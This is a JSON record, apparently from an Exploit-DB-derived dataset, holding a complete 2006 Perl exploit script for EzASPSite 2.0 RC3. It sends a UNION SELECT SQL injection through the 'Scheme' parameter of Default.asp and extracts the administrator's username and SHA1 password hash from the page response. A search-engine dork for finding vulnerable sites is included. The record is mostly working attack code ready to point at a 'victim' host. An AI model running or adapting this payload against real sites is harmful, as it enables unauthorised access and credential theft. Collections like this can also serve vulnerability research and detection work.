{
  "id": "1623",
  "title": "EzASPSite 2.0 RC3 - &#039;Scheme&#039; SQL Injection",
  "cve": null,
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#Method found & Exploit scripted by nukedx\r\n#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com\r\n#Original advisory: http://www.nukedx.com/?viewdoc=22\r\n#Usage: ezasp.pl <host> <path>\r\n#googledork: [ \"Powered By EzASPSite v2.0 RC3\" ] 62.400 Pages..\r\nuse IO::Socket;\r\nif(@ARGV != 2) { usage(); }\r\nelse { exploit(); }\r\nsub header()\r\n{\r\n  print \"\\n- NukedX Security Advisory Nr.2006-22\\r\\n\";\r\n  print \"- EzASPSite <= 2.0 RC3 Remote SQL Injection Exploit\\r\\n\";\r\n}\r\nsub usage() \r\n{\r\n  header();\r\n  print \"- Usage: $0 <host> <path>\\r\\n\";\r\n  print \"- <host> -> Victim's host ex: www.victim.com\\r\\n\";\r\n  print \"- <path> -> Path to EzASPSite ex: /ezasp/\\r\\n\";\r\n  exit();\r\n}\r\nsub exploit () \r\n{\r\n  #Our variables...\r\n  $ezserver = $ARGV[0];\r\n  $ezserver =~ s/(http:\\/\\/)//eg;\r\n  $ezhost   = \"http://\".$ezserver;\r\n  $ezdir    = $ARGV[1];\r\n  $ezport   = \"80\";\r\n  $eztar    = \"Default.asp?Scheme=\";\r\n  $ezxp     = \"-1+UNION+SELECT+0,0,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,username,0,0,0,0,0,0,0,0,'NWPX',0,0,0,0,0,0,0+from+tblAuthor+where+Group_ID=1\";\r\n  $ezreq    = $ezhost.$ezdir.$eztar.$ezxp;\r\n  #Sending data...\r\n  header();\r\n  print \"- Trying to connect: $ezserver\\r\\n\";\r\n  $ez = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => \"$ezserver\", PeerPort => \"$ezport\") || die \"- Connection failed...\\n\";\r\n  print $ez \"GET $ezreq HTTP/1.1\\n\";\r\n  print $ez \"Accept: */*\\n\";\r\n  print $ez \"Referer: $ezhost\\n\";\r\n  print $ez \"Accept-Language: tr\\n\";\r\n  print $ez \"User-Agent: NukeZilla\\n\";\r\n  print $ez \"Cache-Control: no-cache\\n\";\r\n  print $ez \"Host: $ezserver\\n\";\r\n  print $ez \"Connection: close\\n\\n\";\r\n  print \"- Connected...\\r\\n\";\r\n  while ($answer = <$ez>) {\r\n    if ($answer =~ /<link href=\\\"forum\\/(.*?)\\\" rel=\\\"stylesheet\\\"/) {\r\n      print \"- Exploit succeed! Getting admin's information\\r\\n\";\r\n      print \"- USERNAME: $1\\r\\n\";\r\n    }\r\n    if ($answer =~ /bgcolor=\\\"NWPX\\\" background=\\\"forum\\/(.*?)\\\">/) {\r\n      print \"- SHA1 HASH of PASSWORD: $1\\r\\n\";\r\n      exit();\r\n    }\r\n    if ($answer =~ /number of columns/) { \r\n      print \"- This version of EzASPSite is vulnerable too\\r\\n\";\r\n      print \"- but default query of SQL-Inj. does not work on it\\r\\n\";\r\n      print \"- So please edit query by manually adding null data..\\r\\n\";\r\n      exit(); \r\n    }\r\n  }\r\n  #Exploit failed...\r\n  print \"- Exploit failed\\n\"\r\n}\r\n\r\n# nukedx.com [2006-03-29]\r\n\r\n# milw0rm.com [2006-03-29]",
  "url": "https://www.exploit-db.com/exploits/1623"
}